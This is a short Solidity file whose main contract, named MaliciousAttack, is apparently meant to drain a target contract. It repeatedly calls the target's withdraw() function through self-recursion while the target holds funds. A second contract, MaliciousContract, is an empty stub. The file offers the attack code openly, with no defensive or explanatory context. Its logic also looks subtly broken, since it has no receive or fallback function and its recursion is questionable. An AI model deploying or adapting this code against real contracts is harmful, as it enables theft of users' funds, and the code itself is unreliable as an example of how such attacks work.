// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MaliciousContract {
  // ...
}

contract MaliciousAttack {
    address public targetContract;
    address public owner;
    uint public withdrawalAmount;

    constructor(address _targetContract) {
        targetContract = _targetContract;
        withdrawalAmount = 0.1 ether;
        owner = msg.sender;
    }

    function withdrawTokens() public {
        require(msg.sender == owner);
        require(targetContract.balance >= withdrawalAmount);

        (bool success,) = targetContract.call(
            abi.encodeWithSignature("withdraw()")
        );
        if (success) {
            withdrawalAmount -= 0.01 ether;
            withdrawTokens();
        }
    }
}